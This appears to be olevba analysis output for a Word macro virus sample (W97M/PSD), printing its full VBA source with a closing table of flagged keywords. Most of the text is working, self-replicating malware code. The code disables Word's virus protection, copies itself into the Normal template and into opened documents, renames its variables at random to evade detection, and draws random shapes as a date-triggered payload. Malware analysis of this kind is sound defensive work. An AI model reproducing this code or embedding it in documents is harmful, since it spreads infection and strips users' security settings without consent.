olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Psd.b-bef784d8347e5f4e4440edb87fe31b635613599a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Psd.b-bef784d8347e5f4e4440edb87fe31b635613599a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Options.ConfirmConversions = 0: Options.VirusProtection = 0: Options.SaveNormalPrompt = 0
If Day(Now) = Minute(Now) Then
Randomize: For AQ7949 = 1 To (Int(Rnd * 70))
ActiveDocument.Shapes.AddShape(Int(Rnd * 120), Int(Rnd * 200), Int(Rnd * 500), Int(Rnd * 500), Int(Rnd * 500)).Select
Selection.ShapeRange.Fill.ForeColor.RGB = RGB(Int(Rnd * 255), Int(Rnd * 255), Int(Rnd * 255))
Selection.ShapeRange.Fill.Visible = msoTrue
Selection.ShapeRange.Fill.Solid: Next AQ7949: End If
AI900 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
FQ6238 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set DO7785 = ActiveDocument.VBProject.VBComponents.Item(1)
SC4348 = True
End If
If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Pri" Then
Set DO7785 = NormalTemplate.VBProject.VBComponents.Item(1)
CT2161 = True
Call AH5496_TI9362
ActiveDocument.Saved = True
End If
If CT2161 <> True And SC4348 <> True Then GoTo UJ7746
If CT2161 = True Then DO7785.CodeModule.AddFromString ("Private Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, AI900 - 1) & vbCr & "Sub ViewVBCode()" & vbCr & "Application.Quit SaveChanges:=wdDoNotSaveChanges" & vbCr & "End Sub")
If SC4348 = True Then DO7785.CodeModule.AddFromString ("Private Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, FQ6238 - 4))
UJ7746:
If FQ6238 <> 0 And AI900 = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
End Sub 'W97M/PSD.II ...logically delicious! [(c)1998 ALT-F11 code hack]
Private Function AH5496_TI9362()
On Error Resume Next
Randomize
Dim r1(1 To 15) As String
r1(1) = "CO1287": r1(2) = "SF1920": r1(3) = "LI3812": r1(4) = "LJ5880": r1(5) = "TI9362": r1(6) = "AI900"
r1(7) = "FQ6238": r1(8) = "SC4348":: r1(9) = "DO7785": r1(10) = "CT2161": r1(11) = "UJ7746": r1(12) = "AH5496": r1(13) = "HG476": r1(14) = "LH4983": r1(15) = "AQ7949"
For AQ7949 = 1 To 15
a1 = (Chr(65 + Int(Rnd * 22))) & (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 100) & Int(Rnd * 100)
Call TI9362(a1, r1(AQ7949))
Next AQ7949
End Function 'VAMP v1.0 [thanks Vic!]
Private Function TI9362(LH4983, HG476 As String)
On Error Resume Next
Dim CO1287 As Long: Dim SF1920 As Long: Dim LI3812 As Long: Dim LJ5880 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
CO1287 = 1: SF1920 = 1: LI3812 = .CountOfLines: LJ5880 = Len(.Lines(.CountOfLines, 1))
Do While .Find(HG476, CO1287, SF1920, LI3812, LJ5880, True)
strline = .Lines(CO1287, 1)
strline = Left(strline, SF1920 - 1) & LH4983 & Mid(strline, LJ5880)
.replaceline CO1287, strline
CO1287 = LI3812 + 1: SF1920 = 1:
LI3812 = .CountOfLines
LJ5880 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

